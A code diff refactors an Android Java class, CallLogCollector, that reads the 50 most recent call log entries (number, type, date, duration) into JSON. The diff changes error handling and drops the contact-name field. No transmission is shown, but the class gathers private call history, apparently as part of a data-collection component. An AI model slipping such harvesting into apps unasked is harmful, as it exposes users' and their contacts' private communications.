@@ -1,9 +1,9 @@
 package com.alzahra.data;
 
-import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.CallLog;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -16,30 +16,23 @@ public class CallLogCollector {
 
     public JSONArray collectCalls() {
         JSONArray calls = new JSONArray();
-        ContentResolver cr = context.getContentResolver();
-        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
-        
-        if (cursor != null) {
-            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
-            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
-            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+        try {
+            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, 
+                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             
-            while (cursor.moveToNext()) {
-                try {
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
                     JSONObject call = new JSONObject();
-                    call.put("number", cursor.getString(numberIndex));
-                    call.put("type", cursor.getInt(typeIndex));
-                    call.put("date", cursor.getLong(dateIndex));
-                    call.put("duration", cursor.getInt(durationIndex));
-                    call.put("name", cursor.getString(nameIndex) != null ? cursor.getString(nameIndex) : "");
+                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    call.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                    call.put("duration", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                     calls.put(call);
-                } catch (Exception e) {
-                    e.printStackTrace();
                 }
+                cursor.close();
             }
-            cursor.close();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         return calls;
     }
